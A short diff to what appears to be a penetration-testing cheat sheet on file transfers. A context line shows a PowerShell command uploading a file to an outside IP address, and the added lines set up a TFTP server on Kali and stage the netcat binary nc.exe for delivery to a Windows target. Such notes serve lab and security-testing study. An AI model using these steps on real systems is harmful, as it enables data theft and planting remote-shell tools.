@@ -142,3 +142,11 @@ powershell -c "(New-Object System.Net.WebClient).UploadFile('http://10.10.134.25
 ````
 service apache2 stop
 ````
+
+Uploading files with TFTP.
+
+```bash
+root@kali:~# mkdir /tftp
+root@kali:~# atftpd --daemon --port 69 /tftp
+root@kali:~# cp /usr/share/windows-binaries/nc.exe /tftp/
+```
